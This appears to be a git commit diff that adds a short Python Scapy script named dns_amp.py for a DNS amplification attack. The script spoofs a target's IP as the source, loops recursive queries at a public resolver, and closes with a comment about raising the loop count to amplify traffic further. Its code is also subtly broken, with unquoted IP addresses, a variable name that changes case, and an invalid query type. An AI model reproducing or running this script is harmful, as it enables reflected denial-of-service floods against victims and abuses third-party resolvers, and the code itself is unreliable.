c1ec9fde27b421a3febab129ebe11cf8cfe6ae12
mafxs <57727195+mafxs@users.noreply.github.com>
2021-11-13 17:17:50 +0000

    Update dns_amp.py

--- dns_amp.py
+++ dns_amp.py
@@ -1,3 +1,13 @@
-DNS AMP
-sr(IP(src="DNSAMPIP", dst="DNSnameserver")/UDP(dport=53)/DNS(rd=1, qd=DNSQR(dst="google.com", qtype="ANY")))
+from scapy.all import *
+from scapy.layers.dns import *
+from scapy.layers.inet import *
 
+DNS_resolver = 1.1.1.1
+Target = X.X.X.X
+query_name = "google.com"
+query_type = "ALL"
+
+srloop(IP(dst=DNS_Resolver, src=Target)/UDP()/DNS(rd=1, qd=DNSQR(qname=query_name, qtype=query_type)))
+
+
+#looking at how to increase amount of times iterated in srloop to increase traffic amplified
